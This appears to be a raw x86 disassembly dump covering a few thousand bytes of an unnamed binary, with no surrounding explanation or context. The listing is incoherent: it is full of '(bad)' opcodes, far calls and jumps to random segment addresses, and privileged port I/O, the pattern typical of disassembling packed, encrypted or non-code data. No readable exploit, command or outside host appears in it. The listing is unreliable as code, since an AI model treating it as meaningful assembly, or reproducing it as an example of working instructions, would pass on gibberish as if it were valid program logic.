  407d11:	into   
  407d12:	shr    BYTE PTR cs:[esi+0x5],0x96
  407d17:	sub    BYTE PTR [ebx+esi*1-0x114d2a89],0xe
  407d1f:	fldenv [ecx-0x63]
  407d22:	inc    ebp
  407d23:	adc    BYTE PTR [ecx+0x2f6fded6],dh
  407d29:	jge    0x407d30
  407d2b:	pop    edi
  407d2c:	and    esp,eax
  407d2e:	push   0xffffff9f
  407d30:	(bad)  
  407d31:	pop    ss
  407d32:	adc    eax,0x75ed73c3
  407d37:	add    dl,BYTE PTR [edx-0x41]
  407d3a:	sub    ah,BYTE PTR [edi-0x78]
  407d3d:	and    eax,0x4db53470
  407d42:	arpl   WORD PTR ds:0x6f4afae4,bp
  407d48:	(bad)  
  407d49:	jg     0x407d35
  407d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d4c:	mov    ah,0xd6
  407d4e:	and    eax,0x8cd5347c
  407d53:	retf   
  407d54:	xchg   esi,eax
  407d55:	aam    0xed
  407d57:	mov    dh,0xb2
  407d59:	cwde   
  407d5a:	or     DWORD PTR ds:0xa7ef5d22,0x77
  407d61:	mov    ah,0xa2
  407d63:	nop
  407d64:	stos   BYTE PTR es:[edi],al
  407d65:	aaa    
  407d66:	outs   dx,BYTE PTR ds:[esi]
  407d67:	xchg   ecx,eax
  407d68:	lods   al,BYTE PTR ds:[esi]
  407d69:	jmp    0xc5f284ca
  407d6e:	enter  0xafb,0x8e
  407d72:	daa    
  407d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d75:	sbb    ebx,DWORD PTR [ebx]
  407d77:	loop   0x407dea
  407d79:	ins    DWORD PTR es:[edi],dx
  407d7a:	add    eax,0x7526b277
  407d7f:	push   0xe01825da
  407d84:	pop    ss
  407d85:	or     esp,DWORD PTR [edi+0x2d]
  407d88:	lock inc ebx
  407d8a:	push   ebx
  407d8b:	jg     0x407dd4
  407d8d:	mov    ebp,0xa15a9195
  407d92:	mov    ebp,0xb7eb0287
  407d97:	xchg   edi,eax
  407d98:	sbb    ecx,DWORD PTR [ebx]
  407d9a:	and    DWORD PTR [ebp-0x20b88617],esp
  407da0:	mov    bh,0xff
  407da2:	call   0xf4fb:0xeaec2e4b
  407da9:	int    0xfd
  407dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dac:	fwait
  407dad:	add    cl,ch
  407daf:	dec    edx
  407db0:	or     eax,0xb2c204c8
  407db5:	xor    ah,BYTE PTR [esi-0x1fa9a288]
  407dbb:	push   eax
  407dbc:	pop    edx
  407dbd:	or     eax,DWORD PTR [ecx-0x447945a4]
  407dc3:	xchg   esp,eax
  407dc4:	scas   eax,DWORD PTR es:[edi]
  407dc5:	scas   al,BYTE PTR es:[edi]
  407dc6:	call   0x8aa2:0x3b94247f
  407dcd:	jge    0x407d76
  407dcf:	lahf   
  407dd0:	sub    al,0xfd
  407dd2:	call   0x5e189388
  407dd7:	mov    al,ds:0xf41439d0
  407ddc:	call   0x2221f022
  407de1:	nop
  407de2:	call   0x2d2b:0x1c54455d
  407de9:	inc    eax
  407dea:	mov    bh,0xa7
  407dec:	sar    BYTE PTR [ebx-0x7e],cl
  407def:	pop    edi
  407df0:	push   es
  407df1:	sbb    ecx,DWORD PTR [esi+ebp*4]
  407df4:	pop    edi
  407df5:	inc    DWORD PTR [edi+0x6641fcda]
  407dfb:	pop    es
  407dfc:	mov    dl,0xe6
  407dfe:	nop
  407dff:	je     0x407dce
  407e01:	mov    ch,0x91
  407e03:	shl    BYTE PTR [edx+0x50fb2bc8],1
  407e09:	ret    
  407e0a:	or     al,0xaa
  407e0c:	push   esp
  407e0d:	or     esi,DWORD PTR [ebp-0x2148da8a]
  407e13:	xchg   ebp,eax
  407e14:	push   ebx
  407e15:	pop    ss
  407e16:	cdq    
  407e17:	outs   dx,BYTE PTR ds:[esi]
  407e18:	xor    DWORD PTR [ecx-0x2],ebp
  407e1b:	je     0x407dce
  407e1d:	rcr    DWORD PTR [ebx-0x4cf4cfb2],cl
  407e23:	add    eax,0xf3b15ce7
  407e28:	or     edx,edi
  407e2a:	call   0xbca0:0x61c8843c
  407e31:	pop    ds
  407e32:	mov    bh,0x67
  407e34:	adc    BYTE PTR [edi+0x63],dh
  407e37:	ret    0x13e0
  407e3a:	mov    dl,0xd0
  407e3c:	and    al,0xed
  407e3e:	call   0xc26f:0xa13f3598
  407e45:	mov    bl,0xcf
  407e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e48:	aam    0x1f
  407e4a:	push   edi
  407e4b:	xchg   DWORD PTR [eax-0x4],ebx
  407e4e:	or     cl,dh
  407e50:	mov    ds:0x97f19d49,al
  407e55:	jg     0x407e5c
  407e57:	mov    eax,edx
  407e59:	test   eax,0x154c64f8
  407e5e:	jp     0x407dfe
  407e60:	xor    cl,BYTE PTR [edi+eax*1-0x29]
  407e64:	lds    ebp,FWORD PTR [ebx]
  407e66:	xor    BYTE PTR [ecx+0x75],cl
  407e69:	cld    
  407e6a:	popf   
  407e6b:	jle    0x407e3a
  407e6d:	push   edi
  407e6e:	xchg   esp,eax
  407e6f:	push   0xffffffb2
  407e71:	pop    edx
  407e72:	jae    0x407ed6
  407e74:	popa   
  407e75:	or     al,0xaa
  407e77:	pop    edx
  407e78:	aas    
  407e79:	push   0x367972e
  407e7e:	hlt    
  407e7f:	pop    ds
  407e80:	mov    dl,0xd
  407e82:	pop    eax
  407e83:	stos   DWORD PTR es:[edi],eax
  407e84:	pop    ebp
  407e85:	mov    al,ds:0xefd5ea9d
  407e8a:	push   ds
  407e8b:	mov    ds:0xcb384882,al
  407e90:	inc    ebp
  407e91:	mov    ecx,DWORD PTR [eax-0x652fc6a1]
  407e97:	jbe    0x407ed1
  407e99:	rol    DWORD PTR [esi],1
  407e9b:	mov    cl,0x78
  407e9d:	fstp   QWORD PTR [edi+eiz*4-0x18ed48b9]
  407ea4:	leave  
  407ea5:	ins    BYTE PTR es:[edi],dx
  407ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ea7:	push   ds
  407ea8:	mov    dl,0xdb
  407eaa:	in     eax,dx
  407eab:	(bad)  
  407eac:	dec    esp
  407ead:	and    al,0x17
  407eaf:	and    eax,0xf7e80b43
  407eb4:	sub    BYTE PTR [ebp-0x5e],ah
  407eb7:	inc    esp
  407eb8:	pop    es
  407eb9:	int    0x79
  407ebb:	dec    ebx
  407ebc:	push   esi
  407ebd:	or     eax,0xa2f8599a
  407ec2:	and    BYTE PTR [edx+0x1a],0x47
  407ec6:	stos   DWORD PTR es:[edi],eax
  407ec7:	test   al,0xa7
  407ec9:	push   esp
  407eca:	into   
  407ecb:	dec    ebx
  407ecc:	adc    bh,BYTE PTR [eax-0xd65cff1]
  407ed2:	call   0x596d:0x6d8f07a0
  407ed9:	in     eax,0xe5
  407edb:	fcom   DWORD PTR [ebp+0xb]
  407ede:	cmp    al,0x79
  407ee0:	sbb    esi,DWORD PTR [ecx-0x17]
  407ee3:	ret    
  407ee4:	pop    esi
  407ee5:	les    edi,FWORD PTR [esi+ebx*2-0x4e]
  407ee9:	jp     0x407ecd
  407eeb:	sub    al,0x3
  407eed:	scas   eax,DWORD PTR es:[edi]
  407eee:	xchg   DWORD PTR [edi-0x60],ebx
  407ef1:	sbb    al,0xca
  407ef3:	or     eax,0x3dd80bce
  407ef8:	ins    BYTE PTR es:[edi],dx
  407ef9:	addr16 adc al,0xc7
  407efc:	mov    dl,0x80
  407efe:	jecxz  0x407f15
  407f00:	fwait
  407f01:	scas   eax,DWORD PTR es:[edi]
  407f02:	and    BYTE PTR [ecx+0x72],0x8
  407f06:	je     0x407f52
  407f08:	add    al,0xee
  407f0a:	int    0x5
  407f0c:	dec    edx
  407f0d:	cld    
  407f0e:	push   esi
  407f0f:	mov    ds:0x2a7c1db1,al
  407f14:	cs xor edx,ebp
  407f17:	psrad  mm7,mm3
  407f1a:	out    0xa4,eax
  407f1c:	add    eax,0xa87fdbb1
  407f21:	pusha  
  407f22:	sbb    edi,DWORD PTR [edx+0x28dfd788]
  407f28:	mov    dl,0x99
  407f2a:	leave  
  407f2b:	jecxz  0x407f34
  407f2d:	out    dx,al
  407f2e:	in     al,0xc6
  407f30:	outs   dx,BYTE PTR ds:[esi]
  407f31:	jb     0x407ee3
  407f33:	mov    cl,0x4
  407f35:	sti    
  407f36:	fwait
  407f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f38:	pop    edi
  407f39:	pop    es
  407f3a:	inc    ebx
  407f3b:	(bad)  
  407f3c:	into   
  407f3d:	or     al,0x9a
  407f3f:	add    ch,dl
  407f41:	inc    edi
  407f42:	push   ecx
  407f43:	loop   0x407f60
  407f45:	mov    ecx,0xd4d1a677
  407f4a:	mov    dl,0xc5
  407f4c:	cld    
  407f4d:	aaa    
  407f4e:	jb     0x407fb7
  407f50:	ds out dx,al
  407f52:	pusha  
  407f53:	ins    DWORD PTR es:[edi],dx
  407f54:	mov    dl,0x65
  407f56:	mov    eax,ds:0xa970424
  407f5b:	mov    ebx,?
  407f5d:	or     edi,DWORD PTR ds:0x18fb344d
  407f63:	(bad)  
  407f64:	jb     0x407f3c
  407f66:	test   DWORD PTR [ebx+0x48],esi
  407f69:	stos   DWORD PTR es:[edi],eax
  407f6a:	cld    
  407f6b:	dec    esp
  407f6c:	mov    dl,0xb3
  407f6e:	jne    0x407f33
  407f70:	push   esi
  407f71:	pop    ss
  407f72:	and    al,0xa4
  407f74:	sub    al,0x4b
  407f76:	inc    ecx
  407f77:	outs   dx,DWORD PTR ds:[esi]
  407f78:	jmp    0xc0ed980
  407f7d:	add    BYTE PTR [esi+0x1a3d4f4a],bl
  407f83:	push   es
  407f84:	jb     0x407f2c
  407f86:	pop    esp
  407f87:	mov    dh,0x9a
  407f89:	or     edx,DWORD PTR ds:0x49bd9813
  407f8f:	adc    BYTE PTR [esp+edx*8-0x7b],bl
  407f93:	xor    DWORD PTR [edi+0x29],ebx
  407f96:	pop    edx
  407f97:	mul    DWORD PTR [esi]
  407f99:	mov    ebx,0xb3ee1d8
  407f9e:	in     al,dx
  407f9f:	mov    eax,0x63fc808a
  407fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fa5:	inc    edx
  407fa6:	call   0xe97f:0x56657a90
  407fad:	mov    edi,0xf122a6f6
  407fb2:	sub    BYTE PTR [esi+0x33],ah
  407fb5:	fisubr DWORD PTR [edx-0x65267295]
  407fbb:	pusha  
  407fbc:	mov    ebp,0x867c8221
  407fc1:	add    dl,BYTE PTR [esi-0x59]
  407fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fc5:	and    bl,dl
  407fc7:	mov    BYTE PTR [edi],dh
  407fc9:	fistp  DWORD PTR [ecx+0x1e]
  407fcc:	mov    bl,0x69
  407fce:	xor    ah,BYTE PTR [ebp-0x3dd51283]
  407fd4:	xchg   edx,eax
  407fd5:	fistp  DWORD PTR [ecx]
  407fd7:	cdq    
  407fd8:	or     al,0x13
  407fda:	sbb    eax,ecx
  407fdc:	cli    
  407fdd:	and    cl,BYTE PTR [ebx+0x6a]
  407fe0:	dec    edx
  407fe1:	rcl    DWORD PTR [ecx+0x1726bddb],cl
  407fe7:	inc    ebp
  407fe8:	clc    
  407fe9:	retf   0x3aed
  407fec:	add    BYTE PTR [edi+0x5a],0xfb
  407ff0:	and    ecx,DWORD PTR [ebx]
  407ff2:	xor    ah,BYTE PTR [edx-0xc]
  407ff5:	ret    
  407ff6:	xchg   BYTE PTR ds:0x6ba5af54,dh
  407ffc:	fimul  WORD PTR [ebx-0x333b99c6]
  408002:	xchg   edx,eax
  408003:	push   eax
  408004:	inc    edx
  408005:	add    al,0x30
  408007:	daa    
  408008:	sub    eax,0xfa39ada
  40800d:	mov    ds:0x6d4c156b,al
  408012:	xchg   ebp,eax
  408013:	sbb    DWORD PTR [ecx],0x47
  408016:	inc    edi
  408017:	daa    
  408018:	retf   0xda32
  40801b:	jbe    0x408059
  40801d:	push   ss
  40801e:	not    edi
  408020:	in     al,dx
  408021:	mov    bh,0xe7
  408023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408024:	dec    esi
  408025:	je     0x407ff3
  408027:	cwde   
  408028:	cmp    ah,BYTE PTR [eax]
  40802a:	ins    DWORD PTR es:[edi],dx
  40802b:	arpl   WORD PTR [edx-0x38ed0d1d],si
  408031:	leave  
  408032:	and    al,0x95
  408034:	sbb    ecx,DWORD PTR [ebx]
  408036:	sbb    BYTE PTR [edx-0x6c],ah
  408039:	add    BYTE PTR [esi],al
  40803b:	cs mov ebp,0xe7aa9a53
  408041:	in     al,0x7d
  408043:	loopne 0x407ff0
  408045:	and    edx,esp
  408047:	test   eax,0xe4e401e5
  40804c:	rcl    BYTE PTR [esi+ebp*2],cl
  40804f:	or     esi,esp
  408051:	jbe    0x407fd8
  408053:	mov    bh,0x63
  408055:	xor    bl,BYTE PTR [edi]
  408057:	mov    edx,0x961a7f3c
  40805c:	addr16 sub eax,0x6262a70f
  408062:	push   ebp
  408063:	loop   0x40802e
  408065:	popf   
  408066:	cli    
  408067:	dec    eax
  408068:	mov    dl,0x19
  40806a:	nop
  40806b:	dec    ebp
  40806c:	jmp    0x4a94:0xf5e38525
  408073:	dec    edi
  408074:	mov    dl,0x56
  408076:	push   edx
  408077:	mov    cl,dh
  408079:	loop   0x408075
  40807b:	push   ebp
  40807c:	jbe    0x408095
  40807e:	nop
  40807f:	push   esp
  408080:	add    cl,BYTE PTR [ebx+0x3a]
  408083:	mov    DWORD PTR [esi-0x4d573079],ebx
  408089:	xor    DWORD PTR [edx+0x4e],0xbe3e36b3
  408090:	sbb    al,0xb
  408092:	xchg   ecx,eax
  408093:	dec    ebx
  408094:	inc    esi
  408095:	mov    ss,WORD PTR [edi+0x77]
  408098:	dec    ecx
  408099:	push   esi
  40809a:	call   0x232e:0x80e97018
  4080a1:	aas    
  4080a2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080a4:	mov    esi,0x3a4e5af2
  4080a9:	mov    al,ds:0x12b48ce9
  4080ae:	adc    al,0x71
  4080b0:	mov    ch,0xf0
  4080b2:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4080b4:	and    al,0xc5
  4080b6:	rol    ebx,1
  4080b8:	cmp    esp,DWORD PTR [edx]
  4080ba:	jp     0x408131
  4080bc:	lahf   
  4080bd:	fs call 0x3daa:0xde329010
  4080c5:	loopne 0x408108
  4080c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080c8:	call   0x6196:0xc6f56773
  4080cf:	push   DWORD PTR [ecx-0x5601e253]
  4080d5:	mov    eax,ds:0x3bb64f3e
  4080da:	lahf   
  4080db:	mov    ebx,0xe73a406d
  4080e0:	xor    WORD PTR [edi-0x12],si
  4080e4:	std    
  4080e5:	inc    ebx
  4080e6:	jmp    0xff5f2d93
  4080eb:	enter  0x8bf2,0x6f
  4080ef:	mov    ebx,0x57bfe0e4
  4080f4:	or     eax,0xa8a75efd
  4080f9:	lods   eax,DWORD PTR ds:[esi]
  4080fa:	shl    DWORD PTR [edx-0x3025f971],1
  408100:	mov    dl,0x39
  408102:	into   
  408103:	mov    ebx,0x4cfede82
  408108:	mov    ecx,0xb4a0fc17
  40810d:	retf   
  40810e:	in     eax,dx
  40810f:	mov    edi,0x5e582315
  408114:	call   0x3276:0xa10d19b7
  40811b:	push   cs
  40811c:	mov    dl,0x16
  40811e:	ins    BYTE PTR es:[edi],dx
  40811f:	pop    es
  408120:	fucomi st,st(7)
  408122:	jg     0x4080c0
  408124:	push   edx
  408125:	dec    edi
  408126:	or     BYTE PTR [esi],dl
  408128:	ss or  al,0x5
  40812b:	sbb    BYTE PTR [ebx],bh
  40812d:	retf   
  40812e:	xchg   edx,eax
  40812f:	mov    al,ds:0x229d8abf
  408134:	bnd jne 0x4081b1
  408137:	dec    esi
  408138:	rol    bh,cl
  40813a:	adc    BYTE PTR [ebx-0x1f5ffb71],bl
  408140:	(bad)  
  408141:	mov    dh,0xc4
  408143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408144:	dec    ecx
  408145:	hlt    
  408146:	cld    
  408147:	in     al,dx
  408148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408149:	jo     0x4080d2
  40814b:	std    
  40814c:	aad    0x8a
  40814e:	ss push edi
  408150:	mov    dl,0xa1
  408152:	add    eax,0x2089bba2
  408157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408158:	sub    al,0xe1
  40815a:	dec    ebp
  40815b:	imul   edx,eax,0xb2fcfbe2
  408161:	and    BYTE PTR [esi],al
  408163:	retf   0x7b1b
  408166:	push   ebx
  408167:	shr    BYTE PTR [ebp-0x68ab13ea],cl
  40816d:	retf   
  40816e:	cld    
  40816f:	mov    esi,0x27a0f7f
  408174:	mov    ch,0xa1
  408176:	mov    bl,ch
  408178:	sub    dh,dh
  40817a:	jmp    0x408180
  40817c:	leave  
  40817d:	inc    esp
  40817e:	jbe    0x40813a
  408180:	ret    0x6453
  408183:	or     eax,0xaf500bc9
  408188:	(bad)  
  408189:	ret    0xfe7c
  40818c:	and    dh,bl
  40818e:	test   ebp,ebx
  408190:	and    ebp,DWORD PTR [edi]
  408192:	fiadd  DWORD PTR [edi]
  408194:	in     eax,0x3d
  408196:	dec    esi
  408197:	rcl    DWORD PTR [ecx],0x78
  40819a:	ins    DWORD PTR es:[edi],dx
  40819b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40819c:	mov    DWORD PTR [eax+0x78],edi
  40819f:	rol    BYTE PTR [ecx-0x69c38e1],1
  4081a5:	retf   
  4081a6:	call   0x3255:0x3d224a32
  4081ad:	outs   dx,DWORD PTR ds:[esi]
  4081ae:	std    
  4081af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081b0:	or     bh,BYTE PTR [edx+0x59a47117]
  4081b6:	pop    ds
  4081b7:	push   cs
  4081b8:	mov    bl,0x3e
  4081ba:	push   esi
  4081bb:	mov    ebx,0xe75ee784
  4081c0:	popfw  
  4081c2:	dec    ecx
  4081c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081c4:	pop    ecx
  4081c5:	push   edx
  4081c6:	adc    al,0xdd
  4081c8:	sbb    ch,0x3f
  4081cb:	add    esi,DWORD PTR [edx+0x23624bf4]
  4081d1:	icebp  
  4081d2:	in     al,0x4d
  4081d4:	add    DWORD PTR [ebx],ecx
  4081d6:	in     eax,dx
  4081d7:	push   esp
  4081d8:	mov    ds:0x3139fb99,al
  4081dd:	dec    edx
  4081de:	call   0xe23b:0x86b9abf8
  4081e5:	mov    al,0xa6
  4081e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e8:	mov    bl,0xcd
  4081ea:	pushf  
  4081eb:	jl     0x408176
  4081ed:	or     dl,bl
  4081ef:	jmp    0x72bb:0x7f9ae4ff
  4081f6:	sahf   
  4081f7:	aaa    
  4081f8:	jmp    0x4081dc
  4081fa:	xor    al,BYTE PTR [eax+0x59]
  4081fd:	mov    ds:0xbc09138,eax
  408202:	ss std 
  408204:	leave  
  408205:	inc    BYTE PTR ds:0x9a7c3585
  40820b:	retf   
  40820c:	loopne 0x40820f
  40820e:	dec    eax
  40820f:	fild   DWORD PTR [ebx]
  408211:	jp     0x4081b2
  408213:	pushf  
  408214:	push   ds
  408215:	pop    ebx
  408216:	sbb    bh,BYTE PTR [edi]
  408218:	addr16 mov al,ds:0xe1e5
  40821c:	nop
  40821d:	sbb    ebx,DWORD PTR [edx+0x4b0f9f9f]
  408223:	lea    edx,[eax]
  408225:	jbe    0x4081a8
  408227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408228:	push   ds
  408229:	repnz or al,0xef
  40822c:	jo     0x4081eb
  40822e:	inc    esi
  40822f:	push   edi
  408230:	enter  0xa4a6,0xb1
  408234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408235:	push   ss
  408236:	push   edx
  408237:	in     al,0xbd
  408239:	fbstp  TBYTE PTR [ecx+0x2900e47]
  40823f:	call   0x44a79a0f
  408244:	inc    esi
  408245:	(bad)  
  408246:	sbb    edi,ebx
  408248:	sub    eax,0x2c49cf4b
  40824d:	sar    BYTE PTR [esi+ebp*2-0x64bb974e],cl
  408254:	push   esp
  408255:	stos   BYTE PTR es:[edi],al
  408256:	dec    edi
  408257:	lods   al,BYTE PTR ds:[esi]
  408258:	sbb    BYTE PTR [ecx+ebx*2],dh
  40825b:	shl    BYTE PTR [ebx-0x616f4edd],0xa4
  408262:	cmp    DWORD PTR [ebx-0x1c],esp
  408265:	pop    ss
  408266:	call   0xfb93:0x3b637faf
  40826d:	(bad)  
  40826e:	jmp    DWORD PTR [edi-0x66e8c230]
  408274:	into   
  408275:	test   eax,0x37b2bac4
  40827a:	imul   ebx,DWORD PTR [edx-0x11ddea17],0x6b
  408281:	inc    edi
  408282:	mov    bl,0x73
  408284:	mov    ch,0x27
  408286:	stos   DWORD PTR es:[edi],eax
  408287:	xlat   BYTE PTR ds:[ebx]
  408288:	pop    edx
  408289:	fwait
  40828a:	je     0x40830b
  40828c:	xlat   BYTE PTR ds:[ebx]
  40828d:	out    dx,al
  40828e:	mov    eax,ds:0xfd0b2b87
  408293:	xchg   ebx,eax
  408294:	mov    esp,eax
  408296:	mov    fs,edi
  408298:	rol    BYTE PTR [edi+0x19],cl
  40829b:	jp     0x40824f
  40829d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40829e:	jle    0x408311
  4082a0:	jno    0x4082ef
  4082a2:	adc    ah,BYTE PTR [esi]
  4082a4:	mov    dl,0x6f
  4082a6:	js     0x40825a
  4082a8:	mov    eax,0x61e906f4
  4082ad:	or     esp,esi
  4082af:	lahf   
  4082b0:	int    0x7f
  4082b2:	mov    al,ds:0x88872254
  4082b7:	push   0xe9ae823
  4082bc:	ror    BYTE PTR [esi],0x51
  4082bf:	add    dl,BYTE PTR [edi-0x7cc709f5]
  4082c5:	or     al,0x46
  4082c7:	pop    esp
  4082c8:	sbb    bl,BYTE PTR [esi]
  4082ca:	call   0x752e:0xd61861f
  4082d1:	cwde   
  4082d2:	mov    ecx,DWORD PTR [ecx-0x58ce4320]
  4082d8:	test   eax,0xd965f315
  4082dd:	jnp    0x40827c
  4082df:	jo     0x408273
  4082e1:	and    esp,edi
  4082e3:	int    0xc2
  4082e5:	out    dx,eax
  4082e6:	stc    
  4082e7:	arpl   cx,di
  4082e9:	add    BYTE PTR [edi],dh
  4082eb:	mov    dh,BYTE PTR [edx]
  4082ed:	or     bl,BYTE PTR [edx+0x72f290f3]
  4082f3:	add    al,0xb2
  4082f5:	pop    esp
  4082f6:	setns  al
  4082f9:	adc    al,0xe4
  4082fb:	xor    al,0x22
  4082fd:	xor    BYTE PTR [esi+0x6659b2f6],dh
  408303:	mov    bh,0x6d
  408305:	jnp    0x40833f
  408307:	xor    ebp,DWORD PTR [edi-0xa65f21f]
  40830d:	sub    al,0x95
  40830f:	xchg   ebx,eax
  408310:	(bad)
  408313:	stos   BYTE PTR es:[edi],al
  408314:	jno    0x408354
  408316:	mul    DWORD PTR [ebx+ecx*4-0x59841553]
  40831d:	outs   dx,DWORD PTR ds:[esi]
  40831e:	inc    edx
  40831f:	nop
  408320:	inc    ebx
  408321:	sbb    DWORD PTR [edx-0x293b10f6],0x5f
  408328:	push   eax
  408329:	imul   ebx,DWORD PTR [ebp-0x59],0xffffff99
  40832d:	test   DWORD PTR [edx-0x5b],ebx
  408330:	pushf  
  408331:	aad    0xd2
  408333:	fs mov dl,0x41
  408336:	das    
  408337:	es xchg ebp,eax
  408339:	and    BYTE PTR [ebp-0x2e],0xb6
  40833d:	or     ebp,DWORD PTR [esi+0x770a40e4]
  408343:	frstor [eax-0x6b058793]
  408349:	pusha  
  40834a:	jno    0x408313
  40834c:	mov    dl,0x80
  40834e:	pop    esi
  40834f:	mov    esp,0x9acad307
  408354:	and    dl,BYTE PTR [ecx+0x74b9489a]
  40835a:	xor    ebx,ebx
  40835c:	shl    BYTE PTR [eax+0x1d87ec94],0xe4
  408363:	pop    es
  408364:	add    esi,DWORD PTR [eax]
  408366:	push   0xffffffa5
  408368:	xor    al,0xb
  40836a:	lock push eax
  40836c:	inc    edi
  40836d:	xor    al,0x62
  40836f:	imul   edi,DWORD PTR [ecx],0xa3c79a7a
  408375:	dec    ebp
  408376:	cmp    eax,0x51d5f661
  40837b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40837c:	xlat   BYTE PTR ds:[ebx]
  40837d:	push   0xffffffc6
  40837f:	jmp    0xeeab:0x626a4cc2
  408386:	call   0xfab4:0x1b7cf9fd
  40838d:	push   ebx
  40838e:	daa    
  40838f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408390:	into   
  408391:	mov    dl,0x64
  408393:	into   
  408394:	or     bl,BYTE PTR [ebp+0x32]
  408397:	fldcw  WORD PTR [edi-0x4d8b26af]
  40839d:	push   esp
  40839e:	fst    QWORD PTR [esi+0x5d]
  4083a1:	mov    edi,0xa18fa7b8
  4083a6:	clc    
  4083a7:	sahf   
  4083a8:	fisttp QWORD PTR [ecx]
  4083aa:	dec    edi
  4083ab:	test   al,0xb2
  4083ad:	fwait
  4083ae:	aad    0xbc
  4083b0:	cmp    dh,BYTE PTR [ebx+0x58]
  4083b3:	push   cs
  4083b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083b5:	or     ebx,DWORD PTR [edi-0x10]
  4083b8:	lea    esi,[ecx-0x3c25003d]
  4083be:	call   0xae19:0x3eaa3655
  4083c5:	and    dl,0xa7
  4083c8:	xor    ah,cl
  4083ca:	loopne 0x408417
  4083cc:	and    eax,DWORD PTR [ebx]
  4083ce:	mov    fs,WORD PTR [ecx-0x4e]
  4083d1:	and    eax,0x9e7d8afc
  4083d6:	push   ecx
  4083d7:	jg     0x408419
  4083d9:	or     edx,DWORD PTR [eax-0x34]
  4083dc:	fmulp  st(4),st
  4083de:	ret    0x3cd8
  4083e1:	leave  
  4083e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083e3:	outs   dx,DWORD PTR ds:[esi]
  4083e4:	popf   
  4083e5:	or     esi,edi
  4083e7:	pop    ebx
  4083e8:	stos   BYTE PTR es:[edi],al
  4083e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083ea:	mov    cl,bl
  4083ec:	mov    DWORD PTR [ebx],ecx
  4083ee:	leave  
  4083ef:	mov    ds:0xc58e9e81,eax
  4083f4:	cmp    esp,eax
  4083f6:	popf   
  4083f7:	add    esp,DWORD PTR [esi+0x79]
  4083fa:	jp     0x4083f5
  4083fc:	repnz and eax,0x1d55f38
  408402:	imul   esi,edx,0xffffffb9
  408405:	test   DWORD PTR [edi],ecx
  408407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408408:	(bad)  
  408409:	fisttp DWORD PTR [ecx+0x5a]
  40840c:	mov    bh,0x9d
  40840e:	call   0xa949:0xc01773a0
  408415:	popa   
  408416:	hlt    
  408417:	(bad)  [ecx]
  408419:	or     ebx,DWORD PTR [esi+0xd]
  40841c:	add    eax,0x97181f2a
  408421:	popf   
  408422:	call   0xa0ea:0x8bd0c9bb
  408429:	adc    al,0xdd
  40842b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40842c:	(bad)  
  40842d:	sti    
  40842e:	dec    esp
  40842f:	and    al,0x68
  408431:	into   
  408432:	cli    
  408433:	xchg   esi,eax
  408434:	fadd   st(1),st
  408436:	xchg   edi,esp
  408438:	mov    edx,0x5bd9a25
  40843d:	push   ebp
  40843e:	addr16 fwait
  408440:	push   ss
  408441:	add    al,0x28
  408443:	imul   ecx,DWORD PTR [ebx+0x36],0xedfa2fba
  40844a:	fld    DWORD PTR ds:0x3a1d30b2
  408450:	ins    BYTE PTR es:[edi],dx
  408451:	dec    edx
  408452:	sbb    DWORD PTR [edx-0x14],ecx
  408455:	or     al,dh
  408457:	dec    ebx
  408458:	std    
  408459:	sbb    ebx,esi
  40845b:	mov    BYTE PTR [esi],cl
  40845d:	xlat   BYTE PTR ds:[ebx]
  40845e:	mov    ds:0x9b7e5675,eax
  408463:	mov    dh,0xd4
  408465:	mov    ecx,0x557f5a16
  40846a:	pop    esi
  40846b:	lods   eax,DWORD PTR ds:[esi]
  40846c:	or     al,0xb
  40846e:	inc    esp
  40846f:	push   esi
  408470:	jo     0x40843f
  408472:	icebp  
  408473:	push   edx
  408474:	seta   BYTE PTR [edx+0x51ab54a0]
  40847b:	mov    edx,0x17b85882
  408480:	sub    DWORD PTR [ebx],ecx
  408482:	xchg   esp,eax
  408483:	aas    
  408484:	stos   DWORD PTR es:[edi],eax
  408485:	cmp    eax,0x334b5dcd
  40848a:	popf   
  40848b:	pusha  
  40848c:	std    
  40848d:	in     eax,0xf3
  40848f:	mov    edx,esp
  408491:	imul   DWORD PTR [edi+0x6d]
  408494:	push   ebx
  408495:	or     esp,DWORD PTR [ecx-0x48]
  408498:	test   ecx,ebp
  40849a:	loopne 0x4084a0
  40849c:	hlt    
  40849d:	xor    al,0xa6
  40849f:	ficom  WORD PTR [esi+0x287cf0b]
  4084a5:	inc    edi
  4084a6:	or     eax,DWORD PTR [ebp-0xb4f4af]
  4084ac:	outs   dx,DWORD PTR ds:[esi]
  4084ad:	les    edx,FWORD PTR [bp+si]
  4084b0:	cmp    al,0x25
  4084b2:	call   0x8655:0xcc510857
  4084b9:	and    bh,bh
